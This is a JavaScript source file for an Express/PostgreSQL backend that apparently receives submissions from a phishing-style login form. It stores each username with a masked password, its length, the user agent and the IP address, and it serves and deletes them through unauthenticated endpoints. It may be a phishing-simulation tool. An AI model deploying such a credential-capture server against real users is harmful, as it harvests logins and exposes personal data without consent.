import express from 'express';
import cors from 'cors';
import helmet from 'helmet';
import pg from 'pg';

const { Pool } = pg;

const app = express();
const port = Number(process.env.PORT || 3000);

const pool = new Pool({
  host: process.env.DB_HOST || 'localhost',
  port: Number(process.env.DB_PORT || 5432),
  database: process.env.DB_NAME || 'project012',
  user: process.env.DB_USER || 'project012',
  password: process.env.DB_PASSWORD || 'change-this-password',
  max: 10
});

app.use(helmet({
  contentSecurityPolicy: false
}));
app.use(cors());
app.use(express.json({ limit: '20kb' }));

function maskPassword(password) {
  if (!password) {
    return '';
  }

  const visible = password.slice(0, Math.min(2, password.length));
  return `${visible}${'*'.repeat(Math.max(password.length - visible.length, 0))}`;
}

function getClientIp(req) {
  const forwardedFor = req.headers['x-forwarded-for'];
  if (typeof forwardedFor === 'string' && forwardedFor.length > 0) {
    return forwardedFor.split(',')[0].trim();
  }
  return req.socket.remoteAddress || '';
}

async function initializeDatabase() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS captures (
      id SERIAL PRIMARY KEY,
      identifier TEXT NOT NULL,
      password_mask TEXT NOT NULL,
      password_length INTEGER NOT NULL,
      user_agent TEXT,
      ip_address TEXT,
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `);
}

app.get('/api/health', async (_req, res) => {
  await pool.query('SELECT 1');
  res.json({ status: 'ok' });
});

app.post('/api/captures', async (req, res) => {
  const identifier = String(req.body.identifier || '').trim();
  const password = String(req.body.password || '');

  if (identifier.length < 2 || password.length < 1) {
    return res.status(400).json({ message: '아이디와 비밀번호를 입력하세요.' });
  }

  const result = await pool.query(
    `INSERT INTO captures
      (identifier, password_mask, password_length, user_agent, ip_address)
     VALUES ($1, $2, $3, $4, $5)
     RETURNING id, identifier, password_mask, password_length, user_agent, ip_address, created_at`,
    [
      identifier,
      maskPassword(password),
      password.length,
      req.headers['user-agent'] || '',
      getClientIp(req)
    ]
  );

  res.status(201).json(result.rows[0]);
});

app.get('/api/captures', async (_req, res) => {
  const result = await pool.query(`
    SELECT id, identifier, password_mask, password_length, user_agent, ip_address, created_at
    FROM captures
    ORDER BY created_at DESC, id DESC
  `);

  res.json(result.rows);
});

app.delete('/api/captures', async (_req, res) => {
  await pool.query('DELETE FROM captures');
  res.status(204).send();
});

app.use((err, _req, res, _next) => {
  console.error(err);
  res.status(500).json({ message: '서버 오류가 발생했습니다.' });
});

initializeDatabase()
  .then(() => {
    app.listen(port, () => {
      console.log(`Backend listening on port ${port}`);
    });
  })
  .catch((error) => {
    console.error('Failed to initialize database', error);
    process.exit(1);
  });
